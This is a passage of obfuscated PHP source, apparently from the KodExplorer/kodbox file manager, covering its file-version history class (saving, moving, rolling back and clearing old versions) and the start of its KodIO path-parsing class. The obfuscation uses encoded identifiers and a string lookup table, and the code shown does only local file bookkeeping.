$Ë•Ï¨Ùî) { $§Ê¶¸ø =& $_SERVER[ü¢ÙÊñÛ]; if (isset($ÜôÅıØŸ->_data[$§Ê¶¸ø[1225]]) && $ÜôÅıØŸ->_data[$§Ê¶¸ø[1225]]) { return; } $†»áÆÑ€ = $ÜôÅıØŸ->getPathOuter($×Œ§ƒØ); $Ä¨‘¼İ = self::parsePath($†»áÆÑ€); if (!$Ä¨‘¼İ) { return; } self::add($Ä¨‘¼İ); } public static function eventBeforeRename($ÑœöÚÈî) { $„öƒşÊ“ =& $_SERVER[ü¢ÙÊñÛ]; $Œ·›½©Î = self::parsePath($ÑœöÚÈî[0]); if (!$Œ·›½©Î) { return; } $­šŠ ´‚ = self::checkInHistory($Œ·›½©Î); if (!$­šŠ ´‚) { return; } if ($­šŠ ´‚[$„öƒşÊ“[43]] == $„öƒşÊ“[243]) { $ØæÏÚ“ = self::listData($Œ·›½©Î); if ($ØæÏÚ“ && $ØæÏÚ“[$„öƒşÊ“[457]]) { self::moveHistory($Œ·›½©Î, $ÑœöÚÈî[1]); } } else { IO::rename($­šŠ ´‚[$„öƒşÊ“[98]], $ÑœöÚÈî[1]); } } public static function eventBeforeMove($¡ŠÁËØë) { $Ì…Ìôß— =& $_SERVER[ü¢ÙÊñÛ]; $¯é€›«Ğ = self::parsePath($¡ŠÁËØë[0]); if (!$¯é€›«Ğ) { return; } $¯ãÂÍéğ = self::parsePath($¡ŠÁËØë[1]); if (!$¯ãÂÍéğ) { return; } $ Óí…£ = $¡ŠÁËØë[3]; $‚Ç–¤Û€ = self::checkInHistory($¯é€›«Ğ); if (!$‚Ç–¤Û€) { return; } $İøšõ²Û = self::pathHistory($¯ãÂÍéğ); if ($‚Ç–¤Û€[$Ì…Ìôß—[43]] == $Ì…Ìôß—[243]) { $ÈİÇè¦ê = self::listData($¯é€›«Ğ); $×ğşêßı = rtrim($¯ãÂÍéğ, $Ì…Ìôß—[18]) . $Ì…Ìôß—[18] . ($ Óí…£ ? $ Óí…£ : get_path_this($¯é€›«Ğ)); $½êì¼Áó = self::listData($×ğşêßı); if ($ÈİÇè¦ê && $ÈİÇè¦ê[$Ì…Ìôß—[457]] && $½êì¼Áó && $½êì¼Áó[$Ì…Ìôß—[457]]) { return self::clear($¯é€›«Ğ); } if ($ÈİÇè¦ê && $ÈİÇè¦ê[$Ì…Ìôß—[457]]) { self::moveHistory($¯é€›«Ğ, $ Óí…£, $İøšõ²Û); } } else { IO::move($‚Ç–¤Û€[$Ì…Ìôß—[98]], $İøšõ²Û, !1, $ Óí…£); self::clearEmptyFolder(IO::pathFather($‚Ç–¤Û€[$Ì…Ìôß—[98]])); } } public static function eventAfterRemove($Ê÷øÚÃµ, $”‰£äßğ) { $ ¤µ§˜Ü =& $_SERVER[ü¢ÙÊñÛ]; if (!$”‰£äßğ) { return; } $¢é–·¾œ = self::parsePath($Ê÷øÚÃµ[0]); if (!$¢é–·¾œ) { return; } $‘Ù°İøë = self::checkInHistory($¢é–·¾œ); if (!$‘Ù°İøë) { return; } if ($‘Ù°İøë[$ ¤µ§˜Ü[43]] == $ ¤µ§˜Ü[243]) { $ã®ˆ»ÖÙ = self::listData($¢é–·¾œ, !1); if ($ã®ˆ»ÖÙ && $ã®ˆ»ÖÙ[$ ¤µ§˜Ü[457]]) { self::clear($¢é–·¾œ, !1); } } else { IO::remove($‘Ù°İøë[$ ¤µ§˜Ü[98]]); self::clearEmptyFolder(IO::pathFather($‘Ù°İøë[$ ¤µ§˜Ü[98]])); } } private static function checkInHistory($·şÀäæõ) { $–­êÎŒ† = self::pathHistory($·şÀäæõ); if (!IO::exist($–­êÎŒ†)) { $–­êÎŒ† .= $_SERVER[ü¢ÙÊñÛ][1305]; } return IO::exist($–­êÎŒ†) ? IO::info($–­êÎŒ†) : !1; } private static function parsePath($›€¯¤åÌ) { $…éµ»µÓ =& $_SERVER[ü¢ÙÊñÛ]; if (!$›€¯¤åÌ) { return !1; } if (isset($GLOBALS[$…éµ»µÓ[1306]]) && $GLOBALS[$…éµ»µÓ[1306]]) { return; } $¤­Ë½ = KodIO::parse($›€¯¤åÌ); $¬àÉÕĞÂ = $¤­Ë½[$…éµ»µÓ[43]]; $ ª½¯Ş = !$¬àÉÕĞÂ || $¬àÉÕĞÂ == KodIO::KOD_IO || $¬àÉÕĞÂ == KodIO::KOD_SHARE_ITEM; if (!$ ª½¯Ş || !$¤­Ë½[$…éµ»µÓ[1307]]) { return !1; } if (substr($›€¯¤åÌ, 0, strlen(DATA_PATH . $…éµ»µÓ[1308])) == DATA_PATH . $…éµ»µÓ[1308]) { return !1; } if ($¬àÉÕĞÂ == KodIO::KOD_SHARE_ITEM) { $ÑŠùß¹é = IO::init($›€¯¤åÌ); if ($ÑŠùß¹é->pathParse[$…éµ»µÓ[1221]]) { return self::parsePath($ÑŠùß¹é->pathParse[$…éµ»µÓ[1221]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $öà‹şñŒ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $…éµ»µÓ[1309]); foreach ($öà‹şñŒ as $¸¹òŸªü) { if (!$¬àÉÕĞÂ && substr($›€¯¤åÌ, 0, strlen($¸¹òŸªü)) == $¸¹òŸªü) { return !1; } } self::log($GLOBALS[$…éµ»µÓ[1216]] . $…éµ»µÓ[1310] . $›€¯¤åÌ); return $›€¯¤åÌ; } private static function pathHistory($ìŒ¿ïã„) { $ä¼³ÜÆ¹ =& $_SERVER[ü¢ÙÊñÛ]; $ß¬ºŠ¯É = self::$_historyBase . ltrim(KodIO::clear($ìŒ¿ïã„), $ä¼³ÜÆ¹[18]); $ß¬ºŠ¯É = str_replace(array($ä¼³ÜÆ¹[1311]), array($ä¼³ÜÆ¹[1312]), $ß¬ºŠ¯É); return $ß¬ºŠ¯É; } public static function log($Ô›âûÚÕ) { } public static function historyCount($×ÎÕÜÉ) { $İÏ•ˆ©Ÿ =& $_SERVER[ü¢ÙÊñÛ]; $ŠàäşÌ³ = array(); $Œ‰Ã±•Í = array(); foreach ($×ÎÕÜÉ as $öî­³Ò­) { $ÈËÆ«âÎ = get_path_father($öî­³Ò­); if (!$Œ‰Ã±•Í[$ÈËÆ«âÎ]) { $Œ‰Ã±•Í[$ÈËÆ«âÎ] = array(); } $Œ‰Ã±•Í[$ÈËÆ«âÎ][] = get_path_this($öî­³Ò­); } foreach ($Œ‰Ã±•Í as $ÈËÆ«âÎ => $ˆ¤·) { $ŠòÍ¼Ìù = self::parsePath($ÈËÆ«âÎ); if (!$ŠòÍ¼Ìù) { continue; } foreach ($ˆ¤· as $£Íºİàæ) { $ïƒõ•´» = self::listData(rtrim($ŠòÍ¼Ìù, $İÏ•ˆ©Ÿ[18]) . $İÏ•ˆ©Ÿ[18] . $£Íºİàæ, !1); if ($ïƒõ•´» && $ïƒõ•´»[$İÏ•ˆ©Ÿ[457]]) { $ŠàäşÌ³[rtrim($ÈËÆ«âÎ, $İÏ•ˆ©Ÿ[18]) . $İÏ•ˆ©Ÿ[18] . $£Íºİàæ] = count($ïƒõ•´»[$İÏ•ˆ©Ÿ[457]]); } } } return $ŠàäşÌ³; } public static function add($„Ê¦ì‡) { $àÍí¢Ç™ =& $_SERVER[ü¢ÙÊñÛ]; $µÑğÚ‘§ = self::listData($„Ê¦ì‡); if (!$µÑğÚ‘§) { return; } $–°Û­ú§ = Model($àÍí¢Ç™[835])->get($àÍí¢Ç™[1313]); $´åÀÜ¯™ = intval($GLOBALS[$àÍí¢Ç™[16]][$àÍí¢Ç™[103]][$àÍí¢Ç™[1291]]); $·öûç°¡ = $–°Û­ú§ == $àÍí¢Ç™[1314] ? min(5, $´åÀÜ¯™) : $´åÀÜ¯™; if ($´åÀÜ¯™ <= 0) { return; } $ÓöŞÖ¤È = IO::info($„Ê¦ì‡); $®şñ†Ş = $µÑğÚ‘§[$àÍí¢Ç™[457]]; if ($ÓöŞÖ¤È[$àÍí¢Ç™[90]] == 0) { return; } if ($ÓöŞÖ¤È[$àÍí¢Ç™[90]] >= 1024 * 1024 * 500) { return !1; } $Æ™ƒÕÔ¿ = IO::hashSimple($„Ê¦ì‡); if ($®şñ†Ş && $®şñ†Ş[0][$àÍí¢Ç™[686]] == $Æ™ƒÕÔ¿) { return !0; } if (array_key_exists($àÍí¢Ç™[246], $ÓöŞÖ¤È) && !$ÓöŞÖ¤È[$àÍí¢Ç™[246]]) { return !1; } $†ú†–’ = short_id(time()); $ƒ„Í¢ä“ = array($àÍí¢Ç™[486] => $†ú†–’, $àÍí¢Ç™[686] => $Æ™ƒÕÔ¿, $àÍí¢Ç™[42] => $ÓöŞÖ¤È[$àÍí¢Ç™[42]] . $àÍí¢Ç™[20] . date($àÍí¢Ç™[1315]) . rand_string(1), $àÍí¢Ç™[90] => $ÓöŞÖ¤È[$àÍí¢Ç™[90]], $àÍí¢Ç™[538] => USER_ID, $àÍí¢Ç™[244] => time(), $àÍí¢Ç™[1316] => $àÍí¢Ç™[22]); IO::mkdir($µÑğÚ‘§[$àÍí¢Ç™[1317]]); $‡Œá³ù = IO::copy($„Ê¦ì‡, $µÑğÚ‘§[$àÍí¢Ç™[1317]], !1, $ƒ„Í¢ä“[$àÍí¢Ç™[42]]); if (!$‡Œá³ù) { self::clearEmptyFolder($µÑğÚ‘§[$àÍí¢Ç™[1317]]); return !1; } array_unshift($®şñ†Ş, $ƒ„Í¢ä“); if (count($®şñ†Ş) > $·öûç°¡) { $à™İ©® = array_slice($®şñ†Ş, $·öûç°¡); foreach ($à™İ©® as $™Ã³€¥) { IO::remove($µÑğÚ‘§[$àÍí¢Ç™[1317]] . $™Ã³€¥[$àÍí¢Ç™[42]]); } $®şñ†Ş = array_slice($®şñ†Ş, 0, $·öûç°¡); } return self::saveData($µÑğÚ‘§[$àÍí¢Ç™[1318]], $®şñ†Ş); } public static function remove($òƒÆè›¬, $ìÆâåÛ±) { $ø‹¬ËÏ‚ =& $_SERVER[ü¢ÙÊñÛ]; $‚Ô‡½ğ© = self::listData($òƒÆè›¬); $©ÛÀçô× = array(); if (!$‚Ô‡½ğ©) { return !1; } foreach ($‚Ô‡½ğ©[$ø‹¬ËÏ‚[457]] as $ĞıÖœÎÒ) { if ($ĞıÖœÎÒ[$ø‹¬ËÏ‚[486]] == $ìÆâåÛ±) { IO::remove($‚Ô‡½ğ©[$ø‹¬ËÏ‚[1317]] . $ĞıÖœÎÒ[$ø‹¬ËÏ‚[42]]); continue; } $©ÛÀçô×[] = $ĞıÖœÎÒ; } return self::saveData($‚Ô‡½ğ©[$ø‹¬ËÏ‚[1318]], $©ÛÀçô×); } public static function clear($– Ìº®ñ, $ñß§ıÍÍ = true) { $Æ™ë•ô¤ =& $_SERVER[ü¢ÙÊñÛ]; $µªğ¡²Û = self::listData($– Ìº®ñ, $ñß§ıÍÍ); if (!$µªğ¡²Û) { return !1; } foreach ($µªğ¡²Û[$Æ™ë•ô¤[457]] as $“™´ÌóÑ) { IO::remove($µªğ¡²Û[$Æ™ë•ô¤[1317]] . $“™´ÌóÑ[$Æ™ë•ô¤[42]]); } return self::saveData($µªğ¡²Û[$Æ™ë•ô¤[1318]], array()); } public static function moveHistory($Ñ‘—šƒ, $Ä—¬«œ = '', $Ÿşƒ„Å• = '') { $ì¼µãÑ =& $_SERVER[ü¢ÙÊñÛ]; $Ø¥œ¬”» = self::listData($Ñ‘—šƒ, !1); if (!$Ø¥œ¬”» || !$Ø¥œ¬”»[$ì¼µãÑ[457]]) { return !1; } $ÂÛèƒÔ½ = $ì¼µãÑ[1305]; $Ä—¬«œ = $Ä—¬«œ ? $Ä—¬«œ : get_path_this($Ñ‘—šƒ); $Ÿşƒ„Å• = $Ÿşƒ„Å• ? $Ÿşƒ„Å• : $Ø¥œ¬”»[$ì¼µãÑ[1317]]; $Ù˜ëçßÙ = substr(get_path_this($Ø¥œ¬”»[$ì¼µãÑ[1318]]), 0, -strlen($ÂÛèƒÔ½)); foreach ($Ø¥œ¬”»[$ì¼µãÑ[457]] as $·’ŒüÖœ => $…£İü©Ü) { $¡äóİ­ = $Ä—¬«œ . substr($…£İü©Ü[$ì¼µãÑ[42]], strlen($Ù˜ëçßÙ)); $è‰›šŞÓ = IO::move($Ø¥œ¬”»[$ì¼µãÑ[1317]] . $…£İü©Ü[$ì¼µãÑ[42]], $Ÿşƒ„Å•, !1, $¡äóİ­); if ($è‰›šŞÓ) { $Ø¥œ¬”»[$ì¼µãÑ[457]][$·’ŒüÖœ][$ì¼µãÑ[42]] = $¡äóİ­; } } $Ø¥œ¬”»[$ì¼µãÑ[1318]] = IO::move($Ø¥œ¬”»[$ì¼µãÑ[1318]], $Ÿşƒ„Å•, !1, $Ä—¬«œ . $ÂÛèƒÔ½); self::saveData($Ø¥œ¬”»[$ì¼µãÑ[1318]], $Ø¥œ¬”»[$ì¼µãÑ[457]]); self::clearEmptyFolder($Ø¥œ¬”»[$ì¼µãÑ[1317]]); } public static function rollback($‘ˆ¾’“ï, $™©ô…Šš) { $ù•Í· =& $_SERVER[ü¢ÙÊñÛ]; $üô…Ï²½ = self::listData($‘ˆ¾’“ï); if (!$üô…Ï²½) { return; } $²ÏÉõëö = IO::info($‘ˆ¾’“ï); foreach ($üô…Ï²½[$ù•Í·[457]] as $ñØØ‰Êƒ => $µ¹‡Òö˜) { if ($µ¹‡Òö˜[$ù•Í·[486]] == $™©ô…Šš) { self::add($‘ˆ¾’“ï); $€ÜÕâ¨¥ = $üô…Ï²½[$ù•Í·[1317]] . $µ¹‡Òö˜[$ù•Í·[42]]; $š©‡Ş»Š = IO::copy($€ÜÕâ¨¥, IO::pathFather($‘ˆ¾’“ï), REPEAT_REPLACE, $²ÏÉõëö[$ù•Í·[42]]); if ($š©‡Ş»Š) { self::remove($‘ˆ¾’“ï, $™©ô…Šš); } return $š©‡Ş»Š; } } return !1; } public static function setDetail($É£öÂ«—, $Ò°¢–®”, $µ£˜Õ·Î) { $ö×°èÖ¯ =& $_SERVER[ü¢ÙÊñÛ]; $òô‡­“¬ = self::listData($É£öÂ«—); if (!$òô‡­“¬) { return; } foreach ($òô‡­“¬[$ö×°èÖ¯[457]] as $Øî¡“æä => $ñ¨Óˆ) { if ($ñ¨Óˆ[$ö×°èÖ¯[486]] == $Ò°¢–®”) { $òô‡­“¬[$ö×°èÖ¯[457]][$Øî¡“æä][$ö×°èÖ¯[1316]] = $µ£˜Õ·Î; self::saveData($òô‡­“¬[$ö×°èÖ¯[1318]], $òô‡­“¬[$ö×°èÖ¯[457]]); return !0; } } return !1; } public static function fileInfo($ëÖØÕ°õ, $Ïá¥óÏ¼) { $šİ‡¾§‰ =& $_SERVER[ü¢ÙÊñÛ]; $Ü†¥˜ˆí = self::listData($ëÖØÕ°õ); if (!$Ü†¥˜ˆí) { show_json(LNG($šİ‡¾§‰[119]), !1); } $€—îõğ = $šİ‡¾§‰[22]; foreach ($Ü†¥˜ˆí[$šİ‡¾§‰[457]] as $À‰êÀ¶Ñ => $‚áä—ıÕ) { if ($‚áä—ıÕ[$šİ‡¾§‰[486]] != $Ïá¥óÏ¼) { continue; } $€—îõğ = $Ü†¥˜ˆí[$šİ‡¾§‰[1317]] . $‚áä—ıÕ[$šİ‡¾§‰[42]]; break; } if (!$€—îõğ) { show_json(LNG($šİ‡¾§‰[119]), !1); } return IO::info($€—îõğ); } public static function fileOut($Ğ¤”äæ¼, $Å¦ñ¥ãî, $÷™ Ãû = false) { $•ŠÂê²æ =& $_SERVER[ü¢ÙÊñÛ]; $öÕŸŸßı = self::fileInfo($Ğ¤”äæ¼, $Å¦ñ¥ãî); $ğ¶®öó† =& $GLOBALS[$•ŠÂê²æ[17]]; $÷™ Ãû = isset($ğ¶®öó†[$•ŠÂê²æ[1268]]) && $ğ¶®öó†[$•ŠÂê²æ[1268]] == 1; if (isset($ğ¶®öó†[$•ŠÂê²æ[43]]) && $ğ¶®öó†[$•ŠÂê²æ[43]] == $•ŠÂê²æ[1319]) { return IO::fileOutImage($öÕŸŸßı[$•ŠÂê²æ[98]], $ğ¶®öó†[$•ŠÂê²æ[1320]]); } IO::fileOut($öÕŸŸßı[$•ŠÂê²æ[98]], $÷™ Ãû, get_path_this($Ğ¤”äæ¼)); } public static function listData($úÏÁ³â¿, $é¨ÅœÌ = true) { $Ì…óüã =& $_SERVER[ü¢ÙÊñÛ]; if ($é¨ÅœÌ && !IO::exist($úÏÁ³â¿)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($úÏÁ³â¿, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $‘’ ³‚³ = self::pathHistory($úÏÁ³â¿); $í†¾é€ = array($Ì…óüã[1318] => $‘’ ³‚³ . $Ì…óüã[1305], $Ì…óüã[1317] => rtrim(get_path_father($‘’ ³‚³), $Ì…óüã[18]) . $Ì…óüã[18], $Ì…óüã[457] => array()); $íÔ©¦§Î = IO::getContent($í†¾é€[$Ì…óüã[1318]]); if ($íÔ©¦§Î) { $éòİê¥û = json_decode($íÔ©¦§Î, !0); if (is_array($éòİê¥û)) { $í†¾é€[$Ì…óüã[457]] = $éòİê¥û; } } return $í†¾é€; } private static function saveData($Ÿó£õŞ‰, $¹®«±§) { $ëÓ‘€£¸ =& $_SERVER[ü¢ÙÊñÛ]; self::log($ëÓ‘€£¸[1321] . $Ÿó£õŞ‰ . $ëÓ‘€£¸[85] . count($¹®«±§), $ëÓ‘€£¸[817]); if ($¹®«±§) { return IO::setContent($Ÿó£õŞ‰, json_encode($¹®«±§)); } $­¸è†à… = IO::pathFather($Ÿó£õŞ‰); IO::remove($Ÿó£õŞ‰); self::clearEmptyFolder($­¸è†à…); return !0; } public static function clearEmptyFolder($ŠÜßâÔõ) { $°ôİ©ñ =& $_SERVER[ü¢ÙÊñÛ]; if (trim($ŠÜßâÔõ, $°ôİ©ñ[18]) == trim(self::$_historyBase, $°ôİ©ñ[18])) { return; } $Û­Ö­³ = IO::pathFather($ŠÜßâÔõ); $ÚˆÂ­ = IO::has($ŠÜßâÔõ, !0); if ($ÚˆÂ­[$°ôİ©ñ[252]] > 0 || $ÚˆÂ­[$°ôİ©ñ[253]] > 0) { return; } IO::remove($ŠÜßâÔõ); self::clearEmptyFolder($Û­Ö­³); } private static function getBasePath() { $àŒƒ±‹ =& $_SERVER[ü¢ÙÊñÛ]; $òµÀ¦Ç° = Model($àŒƒ±‹[1322])->get($àŒƒ±‹[1323]); if ($òµÀ¦Ç°) { if (!IO::exist($òµÀ¦Ç°)) { IO::mkdir($òµÀ¦Ç°); } if (get_path_this($òµÀ¦Ç°) == $àŒƒ±‹[1308]) { $œ­×’¬ = $àŒƒ±‹[1324] . rand_string(8); @rename($òµÀ¦Ç°, get_path_father($òµÀ¦Ç°) . $àŒƒ±‹[18] . $œ­×’¬); $òµÀ¦Ç° = DATA_PATH . $œ­×’¬ . $àŒƒ±‹[18]; file_put_contents(DATA_PATH . $àŒƒ±‹[1255], $àŒƒ±‹[22]); Model($àŒƒ±‹[1322])->set($àŒƒ±‹[1323], $òµÀ¦Ç°); } return $òµÀ¦Ç°; } $òµÀ¦Ç° = DATA_PATH . $àŒƒ±‹[1324] . rand_string(8) . $àŒƒ±‹[18]; $òµÀ¦Ç° = IO::mkdir($òµÀ¦Ç°); $òµÀ¦Ç° = rtrim($òµÀ¦Ç°, $àŒƒ±‹[18]) . $àŒƒ±‹[18]; file_put_contents($òµÀ¦Ç° . $àŒƒ±‹[1255], $àŒƒ±‹[22]); file_put_contents(DATA_PATH . $àŒƒ±‹[1255], $àŒƒ±‹[22]); Model($àŒƒ±‹[1322])->set($àŒƒ±‹[1323], $òµÀ¦Ç°); return $òµÀ¦Ç°; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\162\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\145\x72\122\145\143\x79\143\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\145\162\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\162\x46\x69\154\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\x46\151\x6c\145\124\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\165\x70\x52\157\157\164\123\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\162\123\150\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\x72\123\x68\x61\x72\145\x4c\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\145\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\x65\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\145\x49\164\145\x6d\x4c\151\156\x6b\175"; const KOD_SEARCH = "\173\163\x65\141\162\x63\x68\175"; const KOD_BLOCK = "\x7b\142\154\x6f\143\153\x7d"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\145\x72\122\x65\x6e\x63\145\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\162\151\166\x65\162\x7d"; public static function typeList() { $ËÒ÷Ê³– =& $_SERVER[ü¢ÙÊñÛ]; return array($ËÒ÷Ê³–[1325] => self::KOD_SOURCE, $ËÒ÷Ê³–[1326] => self::KOD_USER_RECYCLE, $ËÒ÷Ê³–[1327] => self::KOD_USER_FAV, $ËÒ÷Ê³–[1328] => self::KOD_USER_FILE_TAG, $ËÒ÷Ê³–[1329] => self::KOD_USER_FILE_TYPE, $ËÒ÷Ê³–[1330] => self::KOD_GROUP_ROOT_SELF, $ËÒ÷Ê³–[1331] => self::KOD_USER_SHARE, $ËÒ÷Ê³–[1332] => self::KOD_USER_SHARE_LINK, $ËÒ÷Ê³–[1333] => self::KOD_USER_SHARE_TO_ME, $ËÒ÷Ê³–[1334] => self::KOD_SHARE_ITEM, $ËÒ÷Ê³–[1335] => self::KOD_SHARE_LINK, $ËÒ÷Ê³–[1336] => self::KOD_SEARCH, $ËÒ÷Ê³–[1337] => self::KOD_BLOCK, $ËÒ÷Ê³–[1338] => self::KOD_IO, $ËÒ÷Ê³–[1339] => self::KOD_USER_RECENT, $ËÒ÷Ê³–[1340] => self::KOD_USER_DRIVER); } public static function parse($ã—–Ñ) { $¯©¢›¤Õ =& $_SERVER[ü¢ÙÊñÛ]; $ã—–Ñ = self::clear($ã—–Ñ); $…”íï‡Î = array_values(self::typeList()); preg_match($¯©¢›¤Õ[1341], $ã—–Ñ, $”©ı¨ÏÔ); $Ù…ÓµÍë = array($¯©¢›¤Õ[507] => !1, $¯©¢›¤Õ[1342] => !1, $¯©¢›¤Õ[504] => !1, $¯©¢›¤Õ[98] => $ã—–Ñ, $¯©¢›¤Õ[1240] => !1, $¯©¢›¤Õ[1239] => $¯©¢›¤Õ[22]); if (is_array($”©ı¨ÏÔ) && count($”©ı¨ÏÔ) == 5) { $½ÕÛ¸¦ = $¯©¢›¤Õ[1343] . $”©ı¨ÏÔ[2] . $¯©¢›¤Õ[414]; if (in_array($½ÕÛ¸¦, $…”íï‡Î)) { $Ù…ÓµÍë[$¯©¢›¤Õ[1240]] = $”©ı¨ÏÔ[1]; $Ù…ÓµÍë[$¯©¢›¤Õ[43]] = $½ÕÛ¸¦; $Ù…ÓµÍë[$¯©¢›¤Õ[1344]] = substr($½ÕÛ¸¦, 1, -1); $Ù…ÓµÍë[$¯©¢›¤Õ[486]] = $”©ı¨ÏÔ[3]; } $Ù…ÓµÍë[$¯©¢›¤Õ[1239]] = $”©ı¨ÏÔ[4]; } $ÈğÏúƒİ = array($¯©¢›¤Õ[22], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ù…ÓµÍë[$¯©¢›¤Õ[1307]] = in_array($Ù…ÓµÍë[$¯©¢›¤Õ[43]], $ÈğÏúƒİ); return $Ù…ÓµÍë; } public static function isTruePath($Òş¨Ø¯ä) { $ÒÛìü€¸ =& $_SERVER[ü¢ÙÊñÛ]; if (substr($Òş¨Ø¯ä, 0, 1) != $ÒÛìü€¸[1343]) { return !0; } if (strpos($Òş¨Ø¯ä, $ÒÛìü€¸[494]) === 0) { return !0; } if (strpos($Òş¨Ø¯ä, $ÒÛìü€¸[1311]) === 0) { return !0; } if (strpos($Òş¨Ø¯ä, $ÒÛìü€¸[1345]) === 0) { return !0; } if (strpos($Òş¨Ø¯ä, $ÒÛìü€¸[1346]) === 0) { return !0; } if (strpos($Òş¨Ø¯ä, $ÒÛìü€¸[1347]) === 0) { return !0; } return !1; } public static function clear($Â·şİŞÈ) { $€ˆì©…Ã =& $_SERVER[ü¢ÙÊñÛ]; $Â·şİŞÈ = str_replace(array($€ˆì©…Ã[1145], $€ˆì©…Ã[10]), $€ˆì©…Ã[63], $Â·şİŞÈ); $Â·şİŞÈ = str_replace($€ˆì©…Ã[111], $€ˆì©…Ã[18], $Â·şİŞÈ); $ã¯³Š˜Ÿ = $€ˆì©…Ã[1348]; if (substr($Â·şİŞÈ, 0, 3) == $€ˆì©…Ã[1349]) { $Â·şİŞÈ = substr($Â·şİŞÈ, 3); } while (strstr($Â·şİŞÈ, $ã¯³Š˜Ÿ)) { $Â·şİŞÈ = str_replace($ã¯³Š˜Ÿ, $€ˆì©…Ã[18], $Â·şİŞÈ); } $Â·şİŞÈ = preg_replace($€ˆì©…Ã[1350], $€ˆì©…Ã[18], $Â·şİŞÈ); if ($Â·şİŞÈ == $€ˆì©…Ã[18]) { return $€ˆì©…Ã[18]; } $Â·şİŞÈ = rtrim($Â·şİŞÈ, $€ˆì©…Ã[18]); return $Â·şİŞÈ; } public static function pathTrue($ŒÕ¹åÙó) { $‚ÇÚöıì =& $_SERVER[ü¢ÙÊñÛ]; if (!$ŒÕ¹åÙó) { return $‚ÇÚöıì[22]; } $ŒÕ¹åÙó = str_replace($‚ÇÚöıì[267], $‚ÇÚöıì[18], str_replace($‚ÇÚöıì[1351], $‚ÇÚöıì[18], $ŒÕ¹åÙó)); $ŒÕ¹åÙó = str_replace($‚ÇÚöıì[267], $‚ÇÚöıì[18], str_replace($‚ÇÚöıì[1351], $‚ÇÚöıì[18], $ŒÕ¹åÙó)); if (!strstr($ŒÕ¹åÙó, $‚ÇÚöıì[1349])) { return $ŒÕ¹åÙó; } $Çá­õª = explode($‚ÇÚöıì[18], $ŒÕ¹åÙó); foreach ($Çá­õª as $¤ÈœšËè => $ÏÅÄÖğ˜) { if ($ÏÅÄÖğ˜ !== $‚ÇÚöıì[1352]) { continue; } for ($ªÜˆúà = $¤ÈœšËè; $ªÜˆúà >= 0; $ªÜˆúà--) { if ($Çá­õª[$ªÜˆúà] === $‚ÇÚöıì[20] || $Çá­õª[$ªÜˆúà] === $‚ÇÚöıì[1352] || $Çá­õª[$ªÜˆúà] === -1) { continue; } if ($Çá­õª[$ªÜˆúà] === $‚ÇÚöıì[22]) { $Çá­õª[$¤ÈœšËè] = -1; break; } $Çá­õª[$¤ÈœšËè] = -1; $Çá­õª[$ªÜˆúà] = -1; break; } } $ˆé£ò´Ú = array(); foreach ($Çá­õª as $ÏÅÄÖğ˜) { if ($ÏÅÄÖğ˜ !== -1) { $ˆé£ò´Ú[] = $ÏÅÄÖğ˜; } } $Ã°íâ€­ = implode($‚ÇÚöıì[18], $ˆé£ò´Ú); if (strpos($Ã°íâ€­, $‚ÇÚöıì[1353]) === 0) { $Ã°íâ€­ = $‚ÇÚöıì[1349] . substr($Ã°íâ€­, strlen($‚ÇÚöıì[1353])); } return $Ã°íâ€­; } public static function pathUrlClear($Û‚‹ÓÍü) { $ìÀ¬‰éã =& $_SERVER[ü¢ÙÊñÛ]; if (!$Û‚‹ÓÍü) { return $Û‚‹ÓÍü; } $Û‚‹ÓÍü = rawurldecode($Û‚‹ÓÍü); $Û‚‹ÓÍü = str_replace($ìÀ¬‰éã[1351], $ìÀ¬‰éã[18], $Û‚‹ÓÍü); if (strpos($Û‚‹ÓÍü, $ìÀ¬‰éã[87]) > 0) { $Û‚‹ÓÍü = substr($Û‚‹ÓÍü, 0, strpos($Û‚‹ÓÍü, $ìÀ¬‰éã[87])); } if (strpos($Û‚‹ÓÍü, $ìÀ¬‰éã[1354]) > 0) { $Û‚‹ÓÍü = substr($Û‚‹ÓÍü, 0, strpos($Û‚‹ÓÍü, $ìÀ¬‰éã[1354])); } return $Û‚‹ÓÍü; } public static function sourceID($È·°°İä) { $õÙ¤õ³ˆ =& $_SERVER[ü¢ÙÊñÛ]; $øÂåÇÇè = self::parse($È·°°İä); if ($øÂåÇÇè[$õÙ¤õ³ˆ[43]] !== self::KOD_SOURCE) { show_json(LNG($õÙ¤õ³ˆ[1355]), !1); } return $øÂåÇÇè[$õÙ¤õ³ˆ[486]]; } public static function make($¹¬ºıæä) { if (!$¹¬ºıæä) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¹¬ºıæä)); } public static function makeShare($Í²¼º, $ÍŒíöñ—) { return self::makePath(self::KOD_SHARE_ITEM, $Í²¼º, $ÍŒíöñ—); } public static function makeFileTypePath($Ÿßñšš±) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ÿßñšš±); } public static function makeFileTagPath($¯å½‰¢ü) { return self::makePath(self::KOD_USER_FILE_TAG, $¯å½‰¢ü); } public static function makePath($íÍĞÔéÚ, $‚‰í¯± = '', $¤üá×«× = '') { $ôÌèğÄš =& $_SERVER[ü¢ÙÊñÛ]; $Óù…ÊÕ = substr($íÍĞÔéÚ, 1, -1); $Û„¯ş¶¸ = $ôÌèğÄš[1356] . $Óù…ÊÕ . $ôÌèğÄš[1357] . $‚‰í¯± . 